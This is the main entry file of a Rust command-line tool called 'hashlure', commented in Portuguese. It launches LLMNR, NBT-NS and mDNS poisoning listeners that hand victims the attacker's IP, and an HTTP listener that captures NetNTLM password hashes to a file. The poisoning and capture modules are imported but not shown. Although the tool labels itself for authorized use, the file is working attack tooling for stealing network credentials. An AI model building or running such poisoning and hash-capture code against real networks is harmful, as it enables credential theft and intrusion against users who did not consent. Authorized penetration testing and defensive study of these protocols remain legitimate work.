mod dns;
mod http_capture;
mod ntlm;
mod poison;

use anyhow::Result;
use clap::Parser;
use std::net::Ipv4Addr;

/// hashlure — poisoning LLMNR/NBT-NS/mDNS + captura NetNTLM (uso autorizado).
#[derive(Parser)]
#[command(name = "hashlure", version, about)]
struct Cli {
    /// IPv4 do atacante entregue nas respostas (ex: seu IP na LAN).
    #[arg(short = 'I', long)]
    interface_ip: Ipv4Addr,

    #[arg(long)]
    llmnr: bool,
    #[arg(long)]
    nbtns: bool,
    #[arg(long)]
    mdns: bool,
    #[arg(long)]
    http: bool,

    /// Porta do capturador HTTP.
    #[arg(long, default_value_t = 80)]
    http_port: u16,

    /// Arquivo para gravar hashes capturados (append).
    #[arg(short, long)]
    output: Option<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let c = Cli::parse();
    let all = !(c.llmnr || c.nbtns || c.mdns || c.http);
    let ip = c.interface_ip;

    eprintln!("[*] hashlure — uso autorizado apenas. IP entregue: {ip}");
    let mut tasks = Vec::new();

    if all || c.llmnr {
        tasks.push(tokio::spawn(async move {
            poison::run_dns_poison("LLMNR", 5355, Ipv4Addr::new(224, 0, 0, 252), ip).await
        }));
    }
    if all || c.mdns {
        tasks.push(tokio::spawn(async move {
            poison::run_dns_poison("mDNS", 5353, Ipv4Addr::new(224, 0, 0, 251), ip).await
        }));
    }
    if all || c.nbtns {
        tasks.push(tokio::spawn(async move { poison::run_nbtns(ip).await }));
    }
    if all || c.http {
        let port = c.http_port;
        let out = c.output.clone();
        tasks.push(tokio::spawn(async move { http_capture::run(port, out).await }));
    }

    for t in tasks {
        if let Ok(Err(e)) = t.await {
            eprintln!("[!] listener parou: {e}");
        }
    }
    Ok(())
}
